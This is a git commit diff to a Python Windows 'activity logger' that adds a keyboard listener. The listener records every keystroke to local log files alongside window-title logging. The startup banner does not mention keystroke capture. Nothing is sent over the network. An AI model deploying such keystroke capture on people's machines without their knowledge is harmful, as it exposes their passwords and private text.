3ec30e8912f68b762e6abdf174b42f795f39efbd
Ashfaaq Rifath <ashfaaq.rifath2@gmail.com>
2023-08-12 12:41:44 +0530

    Update chronicle_engine.py

--- chronicle_engine.py
+++ chronicle_engine.py
@@ -3,9 +3,12 @@ import os
 import sys
 import time
 import psutil
+import win32com.client
 import logging
+import threading
 import colorama
 import pygetwindow as gw
+from pynput import keyboard
 from colorama import Fore, Back, Style
 colorama.init(autoreset=True)
 
@@ -16,16 +19,17 @@ def progress(percent=0, width=30):
           f' {percent:.0f}%', sep='', end='', flush=True)
 
 print()
-print(Fore.BLACK + Back.YELLOW + " CHRONICLE ENGINE - ACTIVITY LOGGER ")
-print("")
+print(Fore.BLACK + Back.CYAN + " CHRONICLE ENGINE - ACTIVITY LOGGER ")
+print()
 for i in range(101):
     progress(i)
     time.sleep(0.01)
-
 print()
-print(Fore.GREEN + "            Activated")
+print(Fore.GREEN + "    Activity logging started")
 print()
-print(Fore.LIGHTBLACK_EX + "Developed Ashfaaq Rifath - Chronicle Engine v1.2.1")
+print(Fore.GREEN + " Status: Active")
+print()
+print(Fore.LIGHTBLACK_EX + " Copyright © Ashfaaq Rifath - Chronicle Engine v1.2.0")
 print()
 
 date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
@@ -34,17 +38,9 @@ folder = "Activity Logs"
 save_log_file = os.path.join(folder, log_file)
 
 logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
-
 logged_windows = set()
 
-def open_program(app_name, app_path):
-    try:
-        os.startfile(app_path)
-        logging.info(f"Opened {app_name}")
-    except Exception as e:
-        logging.error("ERROR")
-
-def opened_windows():
+def log_windows():
     try:
         global logged_windows
         open_windows = gw.getWindowsWithTitle("")
@@ -53,20 +49,65 @@ def opened_windows():
                 logging.info(f"Opened {window.title}")
                 logged_windows.add(window.title)
 
+                if window.title == "This PC":
+                    logging.info("Opened File Explorer")
+
+                elif window.title == "D:/":
+                    logging.info("Opened Local Disk")
+
+                elif window.title == "E:/":
+                    logging.info("Opened Local Disk")
+
+                elif window.title == "H:/":
+                    logging.info("Opened RACHINTER (H:)")
+
         for title in logged_windows.copy():
             if title not in gw.getAllTitles():
                 logging.info(f"Closed {title}")
                 logged_windows.remove(title)
     except:
-        print(Fore.RED + "Error Handled")
+        print(Fore.RED + " Error Handled")
 
-def main():
+date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
+log_file = str(date).replace(":", "-") + "-Log.txt"
+folder = "Keystroke Logs"
+save_log_file = os.path.join(folder, log_file)
+
+def key_press(key):
+    try:
+        with open(save_log_file, "a") as f:
+            f.write(f"Key pressed: {key.char}\n")
+    except AttributeError:
+        with open(save_log_file, "a") as f:
+            f.write(f"Key pressed: {key}\n")
+
+def key_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+def log_keystrokes():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info("CHRONICLE ENGINE v1.2.1\n" +
-           str(time_stamp) + " \n<< ACTIVITY LOG >> \nBEGIN LOG >>\n")
+    with open(save_log_file, "a") as f:
+        f.write("CHRONICLE ENGINE v1.2.0\n" +
+        str(time_stamp) + " \n<< KEYSTROKE LOG >> \n\n")
+    
+    with keyboard.Listener(on_press=key_press, on_release=key_release) as watcher:
+        watcher.join()
+
+def log_activity():
+    time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
+    logging.info("CHRONICLE ENGINE v1.2.0\n" +
+        str(time_stamp) + " \n<< ACTIVITY LOG >> \n")
 
     while True:
-        opened_windows()
+        log_windows()
 
 if __name__ == "__main__":
-    main()
+    keystroke_thread = threading.Thread(target=log_keystrokes)
+    activity_thread = threading.Thread(target=log_activity)
+
+    keystroke_thread.start()
+    activity_thread.start()
+
+    keystroke_thread.join()
+    activity_thread.join()
